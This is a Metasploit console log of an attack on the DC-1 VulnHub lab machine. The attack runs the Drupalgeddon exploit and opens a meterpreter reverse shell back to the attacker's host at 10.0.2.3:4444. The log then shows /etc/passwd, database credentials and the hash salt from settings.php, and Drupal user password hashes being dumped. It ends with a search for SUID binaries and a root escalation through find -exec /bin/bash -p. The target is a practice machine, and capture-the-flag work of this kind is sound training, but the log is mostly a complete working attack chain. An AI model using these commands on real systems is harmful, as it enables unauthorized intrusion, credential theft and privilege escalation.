@@ -1,0 +1,800 @@
+[*] Spooling to file /home/shrdx/Documents/DC_VulnHub/evidence/msf_console.log...
+resource (/tmp/dc1_msf.rc)> use exploit/multi/http/drupal_drupageddon
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+resource (/tmp/dc1_msf.rc)> set RHOSTS 10.0.2.7
+RHOSTS => 10.0.2.7
+resource (/tmp/dc1_msf.rc)> set RPORT 80
+RPORT => 80
+resource (/tmp/dc1_msf.rc)> set TARGETURI /
+TARGETURI => /
+resource (/tmp/dc1_msf.rc)> set PAYLOAD php/meterpreter/reverse_tcp
+PAYLOAD => php/meterpreter/reverse_tcp
+resource (/tmp/dc1_msf.rc)> set LHOST 10.0.2.3
+LHOST => 10.0.2.3
+resource (/tmp/dc1_msf.rc)> set LPORT 4444
+LPORT => 4444
+resource (/tmp/dc1_msf.rc)> set ExitOnSession false
+[!] Unknown datastore option: ExitOnSession.
+ExitOnSession => false
+resource (/tmp/dc1_msf.rc)> set Wait 5
+Wait => 5
+resource (/tmp/dc1_msf.rc)> exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+resource (/tmp/dc1_msf.rc)> sleep 20
+[*] Started reverse TCP handler on 10.0.2.3:4444 
+[*] Sending stage (72682 bytes) to 10.0.2.7
+[*] Meterpreter session 1 opened (10.0.2.3:4444 -> 10.0.2.7:44755) at 2026-11-27 11:16:06 +0530
+resource (/tmp/dc1_msf.rc)> sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                  Information      Connection
+  --  ----  ----                  -----------      ----------
+  1         meterpreter php/linu  www-data @ DC-1  10.0.2.3:4444 -> 10.0.2.7:4
+            x                                      4755 (10.0.2.7)
+
+resource (/tmp/dc1_msf.rc)> sleep 600
+[-] sleep: Interrupted
+[4mmsf[0m exploit([1m[31mmulti/http/drupal_drupageddon[0m) [0m> sessions -i 1
+[*] Starting interaction with 1...
+
+[4mmeterpreter[0m > sysinfo
+Computer        : DC-1
+OS              : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686
+Architecture    : i686
+System Language : C
+Meterpreter     : php/linux
+[4mmeterpreter[0m > getuid
+Server username: www-data
+[4mmeterpreter[0m > pwd
+/var/www
+[4mmeterpreter[0m > ls -la
+Listing: /var/www
+=================
+
+Mode            Size            Type  Last modified         Name
+----            ----            ----  -------------         ----
+100644/rw-r--r  747324309678    fil   188498731153-02-09 0  .gitignore
+--                                    8:03:43 +0530
+100644/rw-r--r  24769076401799  fil   188498731153-02-09 0  .htaccess
+--                                    8:03:43 +0530
+100644/rw-r--r  6360846566857   fil   188498731153-02-09 0  COPYRIGHT.txt
+--                                    8:03:43 +0530
+100644/rw-r--r  6231997547947   fil   188498731153-02-09 0  INSTALL.mysql.txt
+--                                    8:03:43 +0530
+100644/rw-r--r  8048768714578   fil   188498731153-02-09 0  INSTALL.pgsql.txt
+--                                    8:03:43 +0530
+100644/rw-r--r  5574867551506   fil   188498731153-02-09 0  INSTALL.sqlite.txt
+--                                    8:03:43 +0530
+100644/rw-r--r  76712410891717  fil   188498731153-02-09 0  INSTALL.txt
+--                                    8:03:43 +0530
+100755/rwxr-xr  77704548337324  fil   188270147139-03-11 2  LICENSE.txt
+-x                                    0:32:15 +0530
+100644/rw-r--r  35180077129727  fil   188498731153-02-09 0  MAINTAINERS.txt
+--                                    8:03:43 +0530
+100644/rw-r--r  23089744188672  fil   188498731153-02-09 0  README.txt
+--                                    8:03:43 +0530
+100644/rw-r--r  41412074677674  fil   188498731153-02-09 0  UPGRADE.txt
+--                                    8:03:43 +0530
+100644/rw-r--r  28363964029388  fil   188498731153-02-09 0  authorize.php
+--                                    8:03:43 +0530
+100644/rw-r--r  3092376453840   fil   188498731153-02-09 0  cron.php
+--                                    8:03:43 +0530
+100644/rw-r--r  223338299444    fil   211037522224-07-25 0  flag1.txt
+--                                    9:51:02 +0530
+040755/rwxr-xr  17592186048512  dir   188498731153-02-09 0  includes
+-x                                    8:03:43 +0530
+100644/rw-r--r  2272037700113   fil   188498731153-02-09 0  index.php
+--                                    8:03:43 +0530
+100644/rw-r--r  3019362009791   fil   188498731153-02-09 0  install.php
+--                                    8:03:43 +0530
+040755/rwxr-xr  17592186048512  dir   188498731153-02-09 0  misc
+-x                                    8:03:43 +0530
+040755/rwxr-xr  17592186048512  dir   188498731153-02-09 0  modules
+-x                                    8:03:43 +0530
+040755/rwxr-xr  17592186048512  dir   188498731153-02-09 0  profiles
+-x                                    8:03:43 +0530
+100644/rw-r--r  6704443950617   fil   188498731153-02-09 0  robots.txt
+--                                    8:03:43 +0530
+040755/rwxr-xr  17592186048512  dir   188498731153-02-09 0  scripts
+-x                                    8:03:43 +0530
+040755/rwxr-xr  17592186048512  dir   188498731153-02-09 0  sites
+-x                                    8:03:43 +0530
+040755/rwxr-xr  17592186048512  dir   188498731153-02-09 0  themes
+-x                                    8:03:43 +0530
+100644/rw-r--r  85645942869477  fil   188498731153-02-09 0  update.php
+--                                    8:03:43 +0530
+100644/rw-r--r  9354438772866   fil   188498731153-02-09 0  web.config
+--                                    8:03:43 +0530
+100644/rw-r--r  1791001362849   fil   188498731153-02-09 0  xmlrpc.php
+--                                    8:03:43 +0530
+
+[4mmeterpreter[0m > cat /var/www/flag1.txt
+Every good CMS needs a config file - and so do you.
+[4mmeterpreter[0m > download /var/www/flag1.txt /home/shrdx/Documents/DC_VulnHub/evide nce/flag1.txt
+[*] Downloading: /var/www/flag1.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/flag1.txt
+[*] Downloaded 52.00 B of 208.00 GiB (0.0%): /var/www/flag1.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/flag1.txt
+[*] Completed  : /var/www/flag1.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/flag1.txt
+[4mmeterpreter[0m > cat /var/www/sites/default/settings.php
+<?php
+
+/**
+ *
+ * flag2
+ * Brute force and dictionary attacks aren't the
+ * only ways to gain access (and you WILL need access).
+ * What can you do with these credentials?
+ *
+ */
+
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupaldb',
+      'username' => 'dbuser',
+      'password' => 'R0ck3t',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+
+/**
+ * Access control for update.php script.
+ *
+ * If you are updating your Drupal installation using the update.php script but
+ * are not logged in using either an account with the "Administer software
+ * updates" permission or the site maintenance account (the account that was
+ * created during installation), you will need to modify the access check
+ * statement below. Change the FALSE to a TRUE to disable the access check.
+ * After finishing the upgrade, be sure to open this file again and change the
+ * TRUE back to a FALSE!
+ */
+$update_free_access = FALSE;
+
+/**
+ * Salt for one-time login links and cancel links, form tokens, etc.
+ *
+ * This variable will be set to a random value by the installer. All one-time
+ * login links will be invalidated if the value is changed. Note that if your
+ * site is deployed on a cluster of web servers, you must ensure that this
+ * variable has the same value on each server. If this variable is empty, a hash
+ * of the serialized database credentials will be used as a fallback salt.
+ *
+ * For enhanced security, you may set this variable to a value using the
+ * contents of a file outside your docroot that is never saved together
+ * with any backups of your Drupal files and database.
+ *
+ * Example:
+ *   $drupal_hash_salt = file_get_contents('/home/example/salt.txt');
+ *
+ */
+$drupal_hash_salt = 'X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs';
+
+/**
+ * Base URL (optional).
+ *
+ * If Drupal is generating incorrect URLs on your site, which could
+ * be in HTML headers (links to CSS and JS files) or visible links on pages
+ * (such as in menus), uncomment the Base URL statement below (remove the
+ * leading hash sign) and fill in the absolute URL to your Drupal installation.
+ *
+ * You might also want to force users to use a given domain.
+ * See the .htaccess file for more information.
+ *
+ * Examples:
+ *   $base_url = 'http://www.example.com';
+ *   $base_url = 'http://www.example.com:8888';
+ *   $base_url = 'http://www.example.com/drupal';
+ *   $base_url = 'https://www.example.com:8888/drupal';
+ *
+ * It is not allowed to have a trailing slash; Drupal will add it
+ * for you.
+ */
+# $base_url = 'http://www.example.com';  // NO trailing slash!
+
+/**
+ * PHP settings:
+ *
+ * To see what PHP settings are possible, including whether they can be set at
+ * runtime (by using ini_set()), read the PHP documentation:
+ * http://www.php.net/manual/en/ini.list.php
+ * See drupal_environment_initialize() in includes/bootstrap.inc for required
+ * runtime settings and the .htaccess file for non-runtime settings. Settings
+ * defined there should not be duplicated here so as to avoid conflict issues.
+ */
+
+/**
+ * Some distributions of Linux (most notably Debian) ship their PHP
+ * installations with garbage collection (gc) disabled. Since Drupal depends on
+ * PHP's garbage collection for clearing sessions, ensure that garbage
+ * collection occurs by using the most common settings.
+ */
+ini_set('session.gc_probability', 1);
+ini_set('session.gc_divisor', 100);
+
+/**
+ * Set session lifetime (in seconds), i.e. the time from the user's last visit
+ * to the active session may be deleted by the session garbage collector. When
+ * a session is deleted, authenticated users are logged out, and the contents
+ * of the user's $_SESSION variable is discarded.
+ */
+ini_set('session.gc_maxlifetime', 200000);
+
+/**
+ * Set session cookie lifetime (in seconds), i.e. the time from the session is
+ * created to the cookie expires, i.e. when the browser is expected to discard
+ * the cookie. The value 0 means "until the browser is closed".
+ */
+ini_set('session.cookie_lifetime', 2000000);
+
+/**
+ * If you encounter a situation where users post a large amount of text, and
+ * the result is stripped out upon viewing but can still be edited, Drupal's
+ * output filter may not have sufficient memory to process it.  If you
+ * experience this issue, you may wish to uncomment the following two lines
+ * and increase the limits of these variables.  For more information, see
+ * http://php.net/manual/en/pcre.configuration.php.
+ */
+# ini_set('pcre.backtrack_limit', 200000);
+# ini_set('pcre.recursion_limit', 200000);
+
+/**
+ * Drupal automatically generates a unique session cookie name for each site
+ * based on its full domain name. If you have multiple domains pointing at the
+ * same Drupal site, you can either redirect them all to a single domain (see
+ * comment in .htaccess), or uncomment the line below and specify their shared
+ * base domain. Doing so assures that users remain logged in as they cross
+ * between your various domains. Make sure to always start the $cookie_domain
+ * with a leading dot, as per RFC 2109.
+ */
+# $cookie_domain = '.example.com';
+
+/**
+ * Variable overrides:
+ *
+ * To override specific entries in the 'variable' table for this site,
+ * set them here. You usually don't need to use this feature. This is
+ * useful in a configuration file for a vhost or directory, rather than
+ * the default settings.php. Any configuration setting from the 'variable'
+ * table can be given a new value. Note that any values you provide in
+ * these variable overrides will not be modifiable from the Drupal
+ * administration interface.
+ *
+ * The following overrides are examples:
+ * - site_name: Defines the site's name.
+ * - theme_default: Defines the default theme for this site.
+ * - anonymous: Defines the human-readable name of anonymous users.
+ * Remove the leading hash signs to enable.
+ */
+# $conf['site_name'] = 'My Drupal site';
+# $conf['theme_default'] = 'garland';
+# $conf['anonymous'] = 'Visitor';
+
+/**
+ * A custom theme can be set for the offline page. This applies when the site
+ * is explicitly set to maintenance mode through the administration page or when
+ * the database is inactive due to an error. It can be set through the
+ * 'maintenance_theme' key. The template file should also be copied into the
+ * theme. It is located inside 'modules/system/maintenance-page.tpl.php'.
+ * Note: This setting does not apply to installation and update pages.
+ */
+# $conf['maintenance_theme'] = 'bartik';
+
+/**
+ * Reverse Proxy Configuration:
+ *
+ * Reverse proxy servers are often used to enhance the performance
+ * of heavily visited sites and may also provide other site caching,
+ * security, or encryption benefits. In an environment where Drupal
+ * is behind a reverse proxy, the real IP address of the client should
+ * be determined such that the correct client IP address is available
+ * to Drupal's logging, statistics, and access management systems. In
+ * the most simple scenario, the proxy server will add an
+ * X-Forwarded-For header to the request that contains the client IP
+ * address. However, HTTP headers are vulnerable to spoofing, where a
+ * malicious client could bypass restrictions by setting the
+ * X-Forwarded-For header directly. Therefore, Drupal's proxy
+ * configuration requires the IP addresses of all remote proxies to be
+ * specified in $conf['reverse_proxy_addresses'] to work correctly.
+ *
+ * Enable this setting to get Drupal to determine the client IP from
+ * the X-Forwarded-For header (or $conf['reverse_proxy_header'] if set).
+ * If you are unsure about this setting, do not have a reverse proxy,
+ * or Drupal operates in a shared hosting environment, this setting
+ * should remain commented out.
+ *
+ * In order for this setting to be used you must specify every possible
+ * reverse proxy IP address in $conf['reverse_proxy_addresses'].
+ * If a complete list of reverse proxies is not available in your
+ * environment (for example, if you use a CDN) you may set the
+ * $_SERVER['REMOTE_ADDR'] variable directly in settings.php.
+ * Be aware, however, that it is likely that this would allow IP
+ * address spoofing unless more advanced precautions are taken.
+ */
+# $conf['reverse_proxy'] = TRUE;
+
+/**
+ * Specify every reverse proxy IP address in your environment.
+ * This setting is required if $conf['reverse_proxy'] is TRUE.
+ */
+# $conf['reverse_proxy_addresses'] = array('a.b.c.d', ...);
+
+/**
+ * Set this value if your proxy server sends the client IP in a header
+ * other than X-Forwarded-For.
+ */
+# $conf['reverse_proxy_header'] = 'HTTP_X_CLUSTER_CLIENT_IP';
+
+/**
+ * Page caching:
+ *
+ * By default, Drupal sends a "Vary: Cookie" HTTP header for anonymous page
+ * views. This tells a HTTP proxy that it may return a page from its local
+ * cache without contacting the web server, if the user sends the same Cookie
+ * header as the user who originally requested the cached page. Without "Vary:
+ * Cookie", authenticated users would also be served the anonymous page from
+ * the cache. If the site has mostly anonymous users except a few known
+ * editors/administrators, the Vary header can be omitted. This allows for
+ * better caching in HTTP proxies (including reverse proxies), i.e. even if
+ * clients send different cookies, they still get content served from the cache.
+ * However, authenticated users should access the site directly (i.e. not use an
+ * HTTP proxy, and bypass the reverse proxy if one is used) in order to avoid
+ * getting cached pages from the proxy.
+ */
+# $conf['omit_vary_cookie'] = TRUE;
+
+/**
+ * CSS/JS aggregated file gzip compression:
+ *
+ * By default, when CSS or JS aggregation and clean URLs are enabled Drupal will
+ * store a gzip compressed (.gz) copy of the aggregated files. If this file is
+ * available then rewrite rules in the default .htaccess file will serve these
+ * files to browsers that accept gzip encoded content. This allows pages to load
+ * faster for these users and has minimal impact on server load. If you are
+ * using a webserver other than Apache httpd, or a caching reverse proxy that is
+ * configured to cache and compress these files itself you may want to uncomment
+ * one or both of the below lines, which will prevent gzip files being stored.
+ */
+# $conf['css_gzip_compression'] = FALSE;
+# $conf['js_gzip_compression'] = FALSE;
+
+/**
+ * String overrides:
+ *
+ * To override specific strings on your site with or without enabling the Locale
+ * module, add an entry to this list. This functionality allows you to change
+ * a small number of your site's default English language interface strings.
+ *
+ * Remove the leading hash signs to enable.
+ */
+# $conf['locale_custom_strings_en'][''] = array(
+#   'forum'      => 'Discussion board',
+#   '@count min' => '@count minutes',
+# );
+
+/**
+ *
+ * IP blocking:
+ *
+ * To bypass database queries for denied IP addresses, use this setting.
+ * Drupal queries the {blocked_ips} table by default on every page request
+ * for both authenticated and anonymous users. This allows the system to
+ * block IP addresses from within the administrative interface and before any
+ * modules are loaded. However on high traffic websites you may want to avoid
+ * this query, allowing you to bypass database access altogether for anonymous
+ * users under certain caching configurations.
+ *
+ * If using this setting, you will need to add back any IP addresses which
+ * you may have blocked via the administrative interface. Each element of this
+ * array represents a blocked IP address. Uncommenting the array and leaving it
+ * empty will have the effect of disabling IP blocking on your site.
+ *
+ * Remove the leading hash signs to enable.
+ */
+# $conf['blocked_ips'] = array(
+#   'a.b.c.d',
+# );
+
+/**
+ * Fast 404 pages:
+ *
+ * Drupal can generate fully themed 404 pages. However, some of these responses
+ * are for images or other resource files that are not displayed to the user.
+ * This can waste bandwidth, and also generate server load.
+ *
+ * The options below return a simple, fast 404 page for URLs matching a
+ * specific pattern:
+ * - 404_fast_paths_exclude: A regular expression to match paths to exclude,
+ *   such as images generated by image styles, or dynamically-resized images.
+ *   If you need to add more paths, you can add '|path' to the expression.
+ * - 404_fast_paths: A regular expression to match paths that should return a
+ *   simple 404 page, rather than the fully themed 404 page. If you don't have
+ *   any aliases ending in htm or html you can add '|s?html?' to the expression.
+ * - 404_fast_html: The html to return for simple 404 pages.
+ *
+ * Add leading hash signs if you would like to disable this functionality.
+ */
+$conf['404_fast_paths_exclude'] = '/\/(?:styles)\//';
+$conf['404_fast_paths'] = '/\.(?:txt|png|gif|jpe?g|css|js|ico|swf|flv|cgi|bat|pl|dll|exe|asp)$/i';
+$conf['404_fast_html'] = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML+RDFa 1.0//EN" "http://www.w3.org/MarkUp/DTD/xhtml-rdfa-1.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL "@path" was not found on this server.</p></body></html>';
+
+/**
+ * By default the page request process will return a fast 404 page for missing
+ * files if they match the regular expression set in '404_fast_paths' and not
+ * '404_fast_paths_exclude' above. 404 errors will simultaneously be logged in
+ * the Drupal system log.
+ *
+ * You can choose to return a fast 404 page earlier for missing pages (as soon
+ * as settings.php is loaded) by uncommenting the line below. This speeds up
+ * server response time when loading 404 error pages and prevents the 404 error
+ * from being logged in the Drupal system log. In order to prevent valid pages
+ * such as image styles and other generated content that may match the
+ * '404_fast_html' regular expression from returning 404 errors, it is necessary
+ * to add them to the '404_fast_paths_exclude' regular expression above. Make
+ * sure that you understand the effects of this feature before uncommenting the
+ * line below.
+ */
+# drupal_fast_404();
+
+/**
+ * External access proxy settings:
+ *
+ * If your site must access the Internet via a web proxy then you can enter
+ * the proxy settings here. Currently only basic authentication is supported
+ * by using the username and password variables. The proxy_user_agent variable
+ * can be set to NULL for proxies that require no User-Agent header or to a
+ * non-empty string for proxies that limit requests to a specific agent. The
+ * proxy_exceptions variable is an array of host names to be accessed directly,
+ * not via proxy.
+ */
+# $conf['proxy_server'] = '';
+# $conf['proxy_port'] = 8080;
+# $conf['proxy_username'] = '';
+# $conf['proxy_password'] = '';
+# $conf['proxy_user_agent'] = '';
+# $conf['proxy_exceptions'] = array('127.0.0.1', 'localhost');
+
+/**
+ * Authorized file system operations:
+ *
+ * The Update manager module included with Drupal provides a mechanism for
+ * site administrators to securely install missing updates for the site
+ * directly through the web user interface. On securely-configured servers,
+ * the Update manager will require the administrator to provide SSH or FTP
+ * credentials before allowing the installation to proceed; this allows the
+ * site to update the new files as the user who owns all the Drupal files,
+ * instead of as the user the webserver is running as. On servers where the
+ * webserver user is itself the owner of the Drupal files, the administrator
+ * will not be prompted for SSH or FTP credentials (note that these server
+ * setups are common on shared hosting, but are inherently insecure).
+ *
+ * Some sites might wish to disable the above functionality, and only update
+ * the code directly via SSH or FTP themselves. This setting completely
+ * disables all functionality related to these authorized file operations.
+ *
+ * @see http://drupal.org/node/244924
+ *
+ * Remove the leading hash signs to disable.
+ */
+# $conf['allow_authorize_operations'] = FALSE;
+[4mmeterpreter[0m > download /var/www/sites/default/settings.php /home/shrdx/Documents /DC_VulnHub/evidence/settings.php
+[*] Downloading: /var/www/sites/default/settings.php -> /home/shrdx/Documents/DC_VulnHub/evidence/settings.php
+[*] Downloaded 15.61 KiB of 62.46 TiB (0.0%): /var/www/sites/default/settings.php -> /home/shrdx/Documents/DC_VulnHub/evidence/settings.php
+[*] Completed  : /var/www/sites/default/settings.php -> /home/shrdx/Documents/DC_VulnHub/evidence/settings.php
+[4mmeterpreter[0m > shell
+Process 3408 created.
+Channel 4 created.
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+DC-1
+Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:104::/var/spool/exim4:/bin/false
+statd:x:102:65534::/var/lib/nfs:/bin/false
+messagebus:x:103:107::/var/run/dbus:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
+flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
+/home:
+total 12
+drwxr-xr-x  3 root  root  4096 Feb 19  2019 .
+drwxr-xr-x 23 root  root  4096 Feb 19  2019 ..
+drwxr-xr-x  2 flag4 flag4 4096 Feb 19  2019 flag4
+
+/home/flag4:
+total 28
+drwxr-xr-x 2 flag4 flag4 4096 Feb 19  2019 .
+drwxr-xr-x 3 root  root  4096 Feb 19  2019 ..
+-rw------- 1 flag4 flag4   28 Feb 19  2019 .bash_history
+-rw-r--r-- 1 flag4 flag4  220 Feb 19  2019 .bash_logout
+-rw-r--r-- 1 flag4 flag4 3392 Feb 19  2019 .bashrc
+-rw-r--r-- 1 flag4 flag4  675 Feb 19  2019 .profile
+-rw-r--r-- 1 flag4 flag4  125 Feb 19  2019 flag4.txt
+ls: cannot open directory /root: Permission denied
+/home/flag4
+/home/flag4/flag4.txt
+/var/www/flag1.txt
+/var/lib/mysql/debian-5.5.flag
+/root/thefinalflag.txt
+/usr/src/linux-headers-3.2.0-6-common/arch/x86/include/asm/processor-flags.h
+/usr/src/linux-headers-3.2.0-6-common/arch/x86/include/asm/irqflags.h
+/usr/src/linux-headers-3.2.0-6-common/include/trace/events/gfpflags.h
+/usr/src/linux-headers-3.2.0-6-common/include/asm-generic/irqflags.h
+/usr/src/linux-headers-3.2.0-6-common/include/linux/page-flags.h
+/usr/src/linux-headers-3.2.0-6-common/include/linux/irqflags.h
+/usr/src/linux-headers-3.2.0-6-common/include/linux/kernel-page-flags.h
+/usr/src/linux-headers-3.2.0-6-common/include/linux/pageblock-flags.h
+/usr/src/linux-headers-3.2.0-6-common/include/linux/page-debug-flags.h
+/usr/src/linux-headers-3.2.0-6-686-pae/include/config/zone/dma/flag.h
+/usr/src/linux-headers-3.2.0-6-686-pae/include/config/trace/irqflags
+/usr/src/linux-headers-3.2.0-6-686-pae/include/config/arch/hweight/cflags.h
+/usr/src/linux-headers-3.2.0-6-686-pae/include/config/pageflags
+/usr/share/man/man3/fegetexceptflag.3.gz
+/usr/share/man/man3/fesetexceptflag.3.gz
+/usr/share/doc/tk8.5/examples/images/flagdown.xbm
+/usr/share/doc/tk8.5/examples/images/flagup.xbm
+/usr/include/bits/waitflags.h
+/usr/include/linux/kernel-page-flags.h
+/usr/include/X11/bitmaps/flagdown
+/usr/include/X11/bitmaps/flagup
+/usr/include/i386-linux-gnu/bits/waitflags.h
+/usr/include/i386-linux-gnu/asm/processor-flags.h
+/usr/lib/gcc-4.9-backport/lib/gcc/i486-linux-gnu/4.9/plugin/include/flags.h
+/usr/lib/gcc-4.9-backport/lib/gcc/i486-linux-gnu/4.9/plugin/include/cfg-flags.def
+/usr/lib/gcc-4.9-backport/lib/gcc/i486-linux-gnu/4.9/plugin/include/flag-types.h
+/usr/lib/gcc-4.9-backport/lib/gcc/i486-linux-gnu/4.9/plugin/include/insn-flags.h
+/usr/lib/perl/5.14.2/bits/waitflags.ph
+/usr/lib/perl/5.14.2/auto/POSIX/SigAction/flags.al
+Can you use this same method to find or access the flag in root?
+
+Probably. But perhaps it's not that easy.  Or maybe it is?
+uid	name	pass	mail	status
+0				0
+1	admin	$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR	admin@example.com	1
+2	Fred	$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg	fred@example.org	1
+Tables_in_drupaldb
+actions
+authmap
+batch
+block
+block_custom
+block_node_type
+block_role
+blocked_ips
+cache
+cache_block
+cache_bootstrap
+cache_field
+cache_filter
+cache_form
+cache_image
+cache_menu
+cache_page
+cache_path
+cache_update
+cache_views
+cache_views_data
+comment
+ctools_css_cache
+ctools_object_cache
+date_format_locale
+date_format_type
+date_formats
+field_config
+field_config_instance
+field_data_body
+field_data_comment_body
+field_data_field_image
+field_data_field_tags
+field_revision_body
+field_revision_comment_body
+field_revision_field_image
+field_revision_field_tags
+file_managed
+file_usage
+filter
+filter_format
+flood
+history
+image_effects
+image_styles
+menu_custom
+menu_links
+menu_router
+node
+node_access
+node_comment_statistics
+node_revision
+node_type
+queue
+rdf_mapping
+registry
+registry_file
+role
+role_permission
+search_dataset
+search_index
+search_node_links
+search_total
+semaphore
+sequences
+sessions
+shortcut_set
+shortcut_set_users
+system
+taxonomy_index
+taxonomy_term_data
+taxonomy_term_hierarchy
+taxonomy_vocabulary
+url_alias
+users
+users_roles
+variable
+views_display
+views_view
+watchdog
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+/bin/umount
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/find
+/usr/sbin/exim4
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/sbin/mount.nfs
+/bin/sh: 8: sudo: not found
+nid	title	type	status
+1	Main	page	1
+2	flag3	page	0
+entity_id	body_value
+2	Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
+/bin/sh: 0: Illegal option -p
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+Well done!!!!
+
+Hopefully you've enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+total 32
+drwx------  4 root root 4096 Feb 28  2019 .
+drwxr-xr-x 23 root root 4096 Feb 19  2019 ..
+drwx------  2 root root 4096 Feb 19  2019 .aptitude
+-rw-------  1 root root   44 Feb 28  2019 .bash_history
+-rw-r--r--  1 root root  949 Feb 19  2019 .bashrc
+drwxr-xr-x  3 root root 4096 Feb 19  2019 .drush
+-rw-r--r--  1 root root  140 Nov 20  2007 .profile
+-rw-r--r--  1 root root  173 Feb 19  2019 thefinalflag.txt
+11:define('VERSION', '7.24');
+/bin/sh: 14: download: not found
+/bin/sh: 15: download: not found
+/bin/sh: 16: download: not found
+[4mmeterpreter[0m > download /root/thefinalflag.txt /home/shrdx/Documents/DC_VulnHub/e vidence/thefinalflag.txt
+[-] stdapi_fs_stat: Operation failed: 1
+[4mmeterpreter[0m > download /home/flag4/flag4.txt /home/shrdx/Documents/DC_VulnHub/ev idence/flag4.txt
+[*] Downloading: /home/flag4/flag4.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/flag4.txt
+[*] Downloaded 125.00 B of 500.00 GiB (0.0%): /home/flag4/flag4.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/flag4.txt
+[*] Completed  : /home/flag4/flag4.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/flag4.txt
+[4mmeterpreter[0m > download /tmp/dc1_flag3.txt /home/shrdx/Documents/DC_VulnHub/evide nce/flag3.txt
+[*] Downloading: /tmp/dc1_flag3.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/flag3.txt/dc1_flag3.txt
+[*] Downloaded 125.00 B of 500.00 GiB (0.0%): /tmp/dc1_flag3.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/flag3.txt/dc1_flag3.txt
+[*] Completed  : /tmp/dc1_flag3.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/flag3.txt/dc1_flag3.txt
+[4mmeterpreter[0m > shell
+Process 3448 created.
+Channel 7 created.
+-rw-r--r-- 1 root www-data 173 Nov 27 15:50 /tmp/dc1_final.txt
+[4mmeterpreter[0m > download /tmp/dc1_final.txt /home/shrdx/Documents/DC_VulnHub/evide nce/thefinalflag.txt
+[*] Downloading: /tmp/dc1_final.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/thefinalflag.txt/dc1_final.txt
+[*] Downloaded 173.00 B of 692.00 GiB (0.0%): /tmp/dc1_final.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/thefinalflag.txt/dc1_final.txt
+[*] Completed  : /tmp/dc1_final.txt -> /home/shrdx/Documents/DC_VulnHub/evidence/thefinalflag.txt/dc1_final.txt
+[4mmeterpreter[0m > shell
+Process 3455 created.
+Channel 9 created.
+rm: cannot remove `/tmp/dc1_flag3.txt': Operation not permitted
+rm: cannot remove `/tmp/dc1_final.txt': Operation not permitted
+-rw-r--r-- 1 root www-data 173 Nov 27 15:50 /tmp/dc1_final.txt
+-rw-r--r-- 1 root www-data 125 Nov 27 15:49 /tmp/dc1_flag3.txt
+[4mmeterpreter[0m > /usr/bin/find . -maxdepth 0 -exec /bin/bash -p -c 'rm -f /tmp/dc1_ flag3.txt /tmp/dc1_final.txt' \; -quit
+[-] Unknown command: /usr/bin/find. Run the help command for more details.
+[4mmeterpreter[0m > ls -l /tmp/dc1_flag3.txt /tmp/dc1_final.txt 2>&1
+[-] stdapi_fs_stat: Operation failed: 1
+[4mmeterpreter[0m > exit
+[*] Shutting down session: 1
+
+[*] 10.0.2.7 - Meterpreter session 1 closed.  Reason: User exit
+[4mmsf[0m exploit([1m[31mmulti/http/drupal_drupageddon[0m) [0m> exploit -j
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mmulti/http/drupal_drupageddon[0m) [0m> 
+[*] Started reverse TCP handler on 10.0.2.3:4444 
